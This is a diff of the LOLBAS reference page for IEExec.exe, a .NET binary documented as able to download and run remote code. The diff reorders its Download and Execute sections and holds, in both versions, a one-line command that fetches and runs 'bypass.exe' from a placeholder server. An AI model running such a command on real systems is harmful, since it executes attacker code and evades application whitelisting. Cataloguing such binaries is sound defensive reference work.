@@ -28,18 +28,22 @@
     </div>
 </h1>
 
-
 <ul class="function-list">
-    
-    
-    <li><a href="/lolbas/Binaries/Ieexec/#execute">Execute</a></li>
-    
-    
-    <li><a href="/lolbas/Binaries/Ieexec/#download">Download</a></li>
-    
+	
+	
+	
+	<li><a href="/lolbas/Binaries/Ieexec/#download">Download</a></li>
+	
+	
+	<li><a href="/lolbas/Binaries/Ieexec/#execute">Execute</a></li>
+	
 </ul>
 
+	
+
 <p>The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.</p>
+
+
 
 <br>
 <p><b>Paths:</b> 
@@ -53,90 +57,69 @@
 </p>
 <br>
 <b>Resources:</b> 	
-	<ul style="list-style-type:none">
+<br>
 	
-	<li><a href="https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/">https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/</a></li>
+	<a href="https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/">https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/</a>
+	<br>
 	 
-	</ul>
 <br>
 <p><b>Acknowledgement:</b> 
-	<ul style="list-style-type:none">
+<br>
 	
-	<li>Casey Smith - <a href="https://twitter.com/@subtee">@subtee</a </li>
+	Casey Smith - <a href="https://twitter.com/@subtee">@subtee</a>
+	<br>
 	 
-	</ul>
 </p>
 <br>
-<p><b>Detection:</b> 
-	<ul style="list-style-type:none">
+<p><b>Detection:</b>
+<br>
 	
-	<li></li>
+	
+	<br>
 	 
-	</ul>
 </p>
 <br>
 <br>
 
 
 
-
-
-
-<h2 id="execute" class="function-name">Execute</h2>
-
-<p>The LOLBAS can achieve abritrary code execution.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Downloads and executes bypass.exe from the remote server.</p>
-
+	
+<h2 id="download" class ="function-name">Download</h2>
+	
+		Downloads and executes bypass.exe from the remote server.
+		<br>
+		<pre><code>ieexec.exe http://x.x.x.x:8080/bypass.exe</code></pre>
 		Usecase:Download and run attacker code from remote location
-        <pre><code>ieexec.exe http://x.x.x.x:8080/bypass.exe</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a></li>
-	<br><br>	
-    
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1105">T1105</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
-</ul>
-<br><br>
-
-
-
-
-
-<h2 id="download" class="function-name">Download</h2>
-
-<p>The LOLBAS can download files.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Downloads and executes bypass.exe from the remote server.</p>
-
+	
+<h2 id="execute" class ="function-name">Execute</h2>
+	
+		Downloads and executes bypass.exe from the remote server.
+		<br>
+		<pre><code>ieexec.exe http://x.x.x.x:8080/bypass.exe</code></pre>
 		Usecase:Download and run attacker code from remote location
-        <pre><code>ieexec.exe http://x.x.x.x:8080/bypass.exe</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1105">T1105</a></li>
-	<br><br>	
-    
-
-</ul>
-<br><br>
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
         <script>
          // add permalink on headings
